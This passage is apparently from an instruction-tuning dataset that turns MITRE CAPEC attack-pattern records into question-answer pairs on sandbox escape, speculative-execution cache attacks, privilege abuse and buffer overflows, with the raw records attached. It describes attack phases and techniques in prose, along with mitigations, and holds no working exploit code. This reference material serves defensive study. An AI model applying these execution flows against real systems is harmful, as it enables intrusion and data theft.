              "Phase": "Exploit",
              "Description": "[Exploit the security weaknesses in the standard libraries] The attacker calls malicious code of another language to exploit the security weaknesses in the standard libraries verified in the Experiment phase. The attacker will be able to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox.",
              "Technique": "The attacker calls malicious code of another language to exploit the security weaknesses in the standard libraries."
            }
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "The attacker must have a good knowledge of the platform specific mechanisms of signing and verifying code. Most code signing and verification schemes are based on use of cryptography, the attacker needs to have an understand of these cryptographic operations in good detail."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            },
            {
              "Scope": "Authorization",
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Accountability",
                "Authentication",
                "Authorization",
                "Non-Repudiation"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Assurance: Sanitize the code of the standard libraries to make sure there is no security weaknesses in them.",
            "Design: Use obfuscation and other techniques to prevent reverse engineering the standard libraries.",
            "Assurance: Use static analysis tool to do code review and dynamic tool to do penetration test on the standard library.",
            "Configuration: Get latest updates for the computer."
          ]
        },
        "Example_Instances": {
          "Example": "Exploit: Java/ByteVerify.C is a detection of malicious code that attempts to exploit a vulnerability in the Microsoft Virtual Machine (VM). The VM enables Java programs to run on Windows platforms. The Microsoft Java VM is included in most versions of Windows and Internet Explorer. In some versions of the Microsoft VM, a vulnerability exists because of a flaw in the way the ByteCode Verifier checks code when it is initially being loaded by the Microsoft VM. The ByteCode Verifier is a low level process in the Microsoft VM that is responsible for checking the validity of code - or byte code - as it is initially being loaded into the Microsoft VM. Java/ByteVerify.C attempts to download a file named \"msits.exe\", located in the same virtual directory as the Java applet, into the Windows system folder, and with a random file name. It then tries to execute this specific file. This flaw enables attackers to execute arbitrary code on a user's machine such as writing, downloading and executing additional malware. This vulnerability is addressed by update MS03-011, released in 2003."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "693"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-91"
            },
            {
              "@External_Reference_ID": "REF-92",
              "@Section": "Exploit: Java/ByteVerify.C"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description Summary, Examples-Instances, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated @Name, Description, Execution_Flow, Prerequisites, Related_Attack_Patterns"
            }
          ],
          "Previous_Entry_Name": [
            {
              "@Date": "2018-07-31",
              "#text": "Calling Signed Code From Another Language Within A Sandbox Allow This"
            },
            {
              "@Date": "2020-12-17",
              "#text": "Escaping a Sandbox by Calling Signed Code in Another Language"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Exploitation of Transient Instruction Execution (CAPEC ID: 663)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: A web browser with user-privileges executes JavaScript code imbedded within a malicious website. The system does not disable shared buffers for the web browser and there is no restriction or check upon user-process execution of flush or evict instructions. The Javascript code executes vulnerable transient instructions upon system to cause microarchitectural changes that establish covert channel and transfer sensitive/secret data into shared cache from address space of either kernel, web browser or another executing process on the system.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "A web browser with user-privileges executes JavaScript code imbedded within a malicious website. The system does not disable shared buffers for the web browser and there is no restriction or check upon user-process execution of flush or evict instructions. The Javascript code executes vulnerable transient instructions upon system to cause microarchitectural changes that establish covert channel and transfer sensitive/secret data into shared cache from address space of either kernel, web browser or another executing process on the system.",
      "@Name": "Exploitation of Transient Instruction Execution (CAPEC ID: 663)",
      "attack_ptrn": {
        "@ID": "663",
        "@Name": "Exploitation of Transient Instruction Execution",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "An adversary exploits a hardware design flaw in a CPU implementation of transient instruction execution to expose sensitive data and bypass/subvert access control over restricted resources. Typically, the adversary conducts a covert channel attack to target non-discarded microarchitectural changes caused by transient executions such as speculative execution, branch prediction, instruction pipelining, and/or out-of-order execution. The transient execution results in a series of instructions (gadgets) which construct covert channel and access/transfer the secret data.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "74"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "184",
              "Exclude_Related": [
                {
                  "@Exclude_ID": "403"
                },
                {
                  "@Exclude_ID": "437"
                }
              ]
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "141"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "212"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "124"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "180"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey target application and relevant OS shared code libraries] Adversary identifies vulnerable transient instruction sets and the code/function calls to trigger them as well as instruction sets or code fragments (gadgets) to perform attack.",
              "Technique": "Utilize Disassembler and Debugger tools to examine and trace instruction set execution of source code and shared code libraries on a system."
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Explore cache and identify impacts] Utilize tools to understand the impact of transient instruction execution upon address spaces and CPU operations.",
              "Technique": "Run OS or application specific tools that examine the contents of cache."
            },
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "[Cause conditions for identified transient instruction set execution] Adversary ensures that specific code/instructions of the target process are executed by CPU, so desired transient instructions are executed."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Cause specific secret data to be cached from restricted address space] Executed instruction sets (gadgets) in target address space, initially executed via adversary-chosen transient instructions sets, establish covert channel and transfer secret data across this channel to cache.",
              "Technique": [
                "Prediction-based - adversary trains CPU to incorrectly predict/speculate conditions for instruction execution to be true, hence executing adversary-chosen transient instructions. These prediction-based methods include: Pattern History Table (PHT)/Input Validation Bypass, Branch Target Buffer (BTB)/Branch Target Injection, Return Stack Buffer (RSB)/Return Address Injection, and Store To Load (STL)/Speculative Store Bypass.",
                "Exception/Fault-based - adversary has CPU execute transient instructions that raise an exception allowing inaccessible memory space to be accessed via out-of-order execution. These exception/fault-based methods include: Supervisor-only Bypass, Virtual Translation Bypass, System Register Bypass, FPU Register Bypass, Read-only Bypass, Protection Key Bypass, and Bounds Check Bypass."
              ]
            },
            {
              "Step": "1",
              "Phase": "Exploit",
              "Description": "[Perform covert channel attack to obtain/access secret data] Adversary process code removes instructions/data from shared cache set, waits for target process to reinsert them back into cache, to identify location of secret data via a timing method. Adversary continuously repeat this process to identify and access entirety of targeted secret data.",
              "Technique": [
                "Flush+Reload - adversary frequently flushes targeted memory cache line using a dedicated machine flush instruction, and uses another process to measure time taken for CPU to load victim secret data.",
                "Evict+Time - adversary causes victim to load target set into cache and measures time for victim process to load this data, setting a baseline. Adversary evicts a specified cache line and causes victim process to execute again, and measures any change in execution time, to determine if cache line was accessed.",
                "Prime+Probe - adversary primes cache by filling cache line(s) or set(s) with data, after some time victim process evicts this adversary data to replace it with secret data. The adversary then probes/accesses all the previously accessed cache lines detecting cache misses, which determine that their attacker data has been evicted and replaced with secret data from victim process."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The adversary needs at least user execution access to a system and a maliciously crafted program/application/process with unprivileged code to misuse transient instruction set execution of the CPU."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "High",
              "#text": "Detailed knowledge on how various CPU architectures and microcode perform transient execution for various low-level assembly language code instructions/operations."
            },
            {
              "@Level": "High",
              "#text": "Detailed knowledge on compiled binaries and operating system shared libraries of instruction sequences, and layout of application and OS/Kernel address spaces for data leakage."
            }
          ]
        },
        "Resources_Required": {
          "Resource": [
            "C2C mechanism or direct access to victim system, capable of dropping malicious program and collecting covert channel attack data.",
            "Malicious program capable of triggering execution of transient instructions or vulnerable instruction sequences of victim program and performing a covert channel attack to gather data from victim process memory space. Ultimately, the speed with which an attacker discovers a secret is directly proportional to the computational resources of the victim machine."
          ]
        },
        "Indicators": {
          "Indicator": "File Signatures for Malicious Software capable of abusing Transient Instruction Set Execution"
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Access Control",
              "Impact": "Bypass Protection Mechanism"
            },
            {
              "Scope": "Authorization",
              "Impact": "Execute Unauthorized Commands"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Implementation: DAWG (Dynamically Allocated Way Guard) - processor cache properly divided between different programs/processes that don't share resources",
            "Implementation: KPTI (Kernel Page-Table Isolation) to completely separate user-space and kernel space page tables",
            "Configuration: Architectural Design of Microcode to limit abuse of speculative execution and out-of-order execution",
            "Configuration: Disable SharedArrayBuffer for Web Browsers",
            "Configuration: Disable Copy-on-Write between Cloud VMs",
            "Configuration: Privilege Checks on Cache Flush Instructions",
            "Implementation: Non-inclusive Cache Memories to prevent Flush+Reload Attacks"
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "A web browser with user-privileges executes JavaScript code imbedded within a malicious website. The system does not disable shared buffers for the web browser and there is no restriction or check upon user-process execution of flush or evict instructions. The Javascript code executes vulnerable transient instructions upon system to cause microarchitectural changes that establish covert channel and transfer sensitive/secret data into shared cache from address space of either kernel, web browser or another executing process on the system."
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "1037"
            },
            {
              "@CWE_ID": "1303"
            },
            {
              "@CWE_ID": "1264"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-637"
            },
            {
              "@External_Reference_ID": "REF-638"
            },
            {
              "@External_Reference_ID": "REF-639"
            },
            {
              "@External_Reference_ID": "REF-640"
            },
            {
              "@External_Reference_ID": "REF-641"
            },
            {
              "@External_Reference_ID": "REF-642"
            },
            {
              "@External_Reference_ID": "REF-643"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2021-06-24"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2022-02-22",
            "Modification_Comment": "Updated Related_Attack_Patterns"
          }
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Privilege Abuse (CAPEC ID: 122)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: Improperly configured account privileges allowed unauthorized users on a hospital's network to access the medical records for over 3,000 patients. Thus compromising data integrity and confidentiality in addition to HIPAA violations.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Improperly configured account privileges allowed unauthorized users on a hospital's network to access the medical records for over 3,000 patients. Thus compromising data integrity and confidentiality in addition to HIPAA violations.",
      "@Name": "Privilege Abuse (CAPEC ID: 122)",
      "attack_ptrn": {
        "@ID": "122",
        "@Name": "Privilege Abuse",
        "@Abstraction": "Meta",
        "@Status": "Draft",
        "Description": "An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources.",
        "Extended_Description": {
          "xhtml:p": [
            "If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts.",
            "This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level."
          ]
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "CanPrecede",
            "@CAPEC_ID": "664"
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target must have misconfigured their access control mechanisms such that sensitive information, which should only be accessible to more trusted users, remains accessible to less trusted users.",
            "The adversary must have access to the target, albeit with an account that is less privileged than would be appropriate for the targeted resources."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Adversary can leverage privileged features they already have access to without additional effort or skill. Adversary is only required to have access to an account with improper priveleges."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack. The ability to access the target is required."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Authorization",
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Authorization",
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Configure account privileges such privileged/administrator functionality is not exposed to non-privileged/lower accounts."
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "Improperly configured account privileges allowed unauthorized users on a hospital's network to access the medical records for over 3,000 patients. Thus compromising data integrity and confidentiality in addition to HIPAA violations."
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "269"
            },
            {
              "@CWE_ID": "732"
            },
            {
              "@CWE_ID": "1317"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1548",
            "Entry_Name": "Abuse Elevation Control Mechanism"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Consequences, Example_Instances, Likelihood_Of_Attack, Mitigations, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Overflow Buffers (CAPEC ID: 100), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: The most straightforward example is an application that reads in input from the user and stores it in an internal buffer but does not check that the size of the input data is less than or equal to the size of the buffer. If the user enters excessive length data, the buffer may overflow leading to the application crashing, or worse, enabling the user to cause execution of injected code.\nMany web servers enforce security in web applications through the use of filter plugins. An example is the SiteMinder plugin used for authentication. An overflow in such a plugin, possibly through a long URL or redirect parameter, can allow an adversary not only to bypass the security checks but also execute arbitrary code on the target web server in the context of the user that runs the web server process.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "The most straightforward example is an application that reads in input from the user and stores it in an internal buffer but does not check that the size of the input data is less than or equal to the size of the buffer. If the user enters excessive length data, the buffer may overflow leading to the application crashing, or worse, enabling the user to cause execution of injected code.",
        "Many web servers enforce security in web applications through the use of filter plugins. An example is the SiteMinder plugin used for authentication. An overflow in such a plugin, possibly through a long URL or redirect parameter, can allow an adversary not only to bypass the security checks but also execute arbitrary code on the target web server in the context of the user that runs the web server process."
      ],
      "@Name": "Overflow Buffers (CAPEC ID: 100)",
      "attack_ptrn": {
        "@ID": "100",
        "@Name": "Overflow Buffers",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "Buffer Overflow attacks target improper or missing bounds checking on buffer operations, typically triggered by input injected by an adversary. As a consequence, an adversary is able to write past the boundaries of allocated buffer regions in memory, causing a program crash or potentially redirection of execution as per the adversaries' choice.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "123"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. Adversaries often look for applications that accept user input and that perform manual memory management."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.",
              "Technique": "Provide large input to a program or application and observe the behavior. If there is a crash, this means that a buffer overflow attack is possible."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.",
              "Technique": [
                "Create malicious shellcode that will execute when the program execution is returned to it.",
                "Use a NOP-sled in the overflow content to more easily \"slide\" into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs"
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Overflow the buffer] Using the injection vector, the adversary injects the crafted overflow content into the buffer."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Targeted software performs buffer operations.",
            "Targeted software inadequately performs bounds-checking on buffer operations.",
            "Adversary has the capability to influence the input to buffer operations."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "In most cases, overflowing a buffer does not require advanced skills beyond the ability to notice an overflow and stuff an input variable with content."
            },
            {
              "@Level": "High",
              "#text": "In cases of directed overflows, where the motive is to divert the flow of the program or application as per the adversaries' bidding, high level skills are required. This may involve detailed knowledge of the target system architecture and kernel."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack. Detecting and exploiting a buffer overflow does not require any resources beyond knowledge of and access to the target system."
        },
        "Indicators": {
          "Indicator": "An attack designed to leverage a buffer overflow and redirect execution as per the adversary's bidding is fairly difficult to detect. An attack aimed solely at bringing the system down is usually preceded by a barrage of long inputs that make no sense. In either case, it is likely that the adversary would have resorted to a few hit-or-miss attempts that will be recorded in the system event logs, if they exist."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Use a language or compiler that performs automatic bounds checking.",
            "Use secure functions not vulnerable to buffer overflow.",
            "If you have to use dangerous functions, make sure that you do boundary checking.",
            "Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.",
            "Use OS-level preventative functionality. Not a complete solution.",
            "Utilize static source code analysis tools to identify potential buffer overflow weaknesses in the software."
          ]
        },
        "Example_Instances": {
          "Example": [
            "The most straightforward example is an application that reads in input from the user and stores it in an internal buffer but does not check that the size of the input data is less than or equal to the size of the buffer. If the user enters excessive length data, the buffer may overflow leading to the application crashing, or worse, enabling the user to cause execution of injected code.",
            "Many web servers enforce security in web applications through the use of filter plugins. An example is the SiteMinder plugin used for authentication. An overflow in such a plugin, possibly through a long URL or redirect parameter, can allow an adversary not only to bypass the security checks but also execute arbitrary code on the target web server in the context of the user that runs the web server process."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "120"
            },
            {
              "@CWE_ID": "119"
            },
            {
              "@CWE_ID": "131"
            },
            {
              "@CWE_ID": "129"
            },
            {
              "@CWE_ID": "805"
            },
            {
              "@CWE_ID": "680"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "07",
              "Entry_Name": "Buffer Overflow"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "Buffer overflow attack"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-620",
            "@Section": "Buffer Overflow"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Indicators-Warnings_of_Attack, Probing_Techniques, Related_Vulnerabilities, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Buffer Overflow via Symbolic Links (CAPEC ID: 45)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: The EFTP server has a buffer overflow that can be exploited if an adversary uploads a .lnk (link) file that contains more than 1,744 bytes. This is a classic example of an indirect buffer overflow. First the adversary uploads some content (the link file) and then the adversary causes the client consuming the data to be exploited. In this example, the ls command is exploited to compromise the server software.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "The EFTP server has a buffer overflow that can be exploited if an adversary uploads a .lnk (link) file that contains more than 1,744 bytes. This is a classic example of an indirect buffer overflow. First the adversary uploads some content (the link file) and then the adversary causes the client consuming the data to be exploited. In this example, the ls command is exploited to compromise the server software.",
      "@Name": "Buffer Overflow via Symbolic Links (CAPEC ID: 45)",
      "attack_ptrn": {
        "@ID": "45",
        "@Name": "Buffer Overflow via Symbolic Links",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This type of attack leverages the use of symbolic links to cause buffer overflows. An adversary can try to create or manipulate a symbolic link file such that its contents result in out of bounds data. When the target software processes the symbolic link file, it could potentially overflow internal buffers with insufficient bounds checking.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "100"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify target application] The adversary identifies a target application or program that might load in certain files to memory."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.",
              "Technique": "The adversary creates or modifies a symbolic link pointing to those files which contain an excessive amount of data. If creating a symbolic link to one of those files causes different behavior in the application, then an injection vector has been identified."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Craft overflow file content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.",
              "Technique": [
                "Create malicious shellcode that will execute when the program execution is returned to it.",
                "Use a NOP-sled in the overflow content to more easily \"slide\" into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs"
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Overflow the buffer] Using the specially crafted file content, the adversary creates a symbolic link from the identified resource to the malicious file, causing a targeted buffer overflow attack."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The adversary can create symbolic link on the target host.",
            "The target host does not perform correct boundary checking while consuming data from a resources."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "An adversary can simply overflow a buffer by inserting a long string into an adversary-modifiable injection vector. The result can be a DoS."
            },
            {
              "@Level": "High",
              "#text": "Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level."
            }
          ]
        },
        "Indicators": {
          "Indicator": [
            "An adversary creating or modifying Symbolic links is a potential signal of attack in progress.",
            "An adversary deleting temporary files can also be a sign that the adversary is trying to replace legitimate resources with malicious ones."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Pay attention to the fact that the resource you read from can be a replaced by a Symbolic link. You can do a Symlink check before reading the file and decide that this is not a legitimate way of accessing the resource.",
            "Because Symlink can be modified by an adversary, make sure that the ones you read are located in protected directories.",
            "Pay attention to the resource pointed to by your symlink links (See attack pattern named \"Forced Symlink race\"), they can be replaced by malicious resources.",
            "Always check the size of the input data before copying to a buffer.",
            "Use a language or compiler that performs automatic bounds checking.",
            "Use an abstraction library to abstract away risky APIs. Not a complete solution.",
            "Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.",
            "Use OS-level preventative functionality. Not a complete solution."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "The EFTP server has a buffer overflow that can be exploited if an adversary uploads a .lnk (link) file that contains more than 1,744 bytes. This is a classic example of an indirect buffer overflow. First the adversary uploads some content (the link file) and then the adversary causes the client consuming the data to be exploited. In this example, the ls command is exploited to compromise the server software."
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "120"
            },
            {
              "@CWE_ID": "285"
            },
            {
              "@CWE_ID": "302"
            },
            {
              "@CWE_ID": "118"
            },
            {
              "@CWE_ID": "119"
            },
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "680"
            },
            {
              "@CWE_ID": "697"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
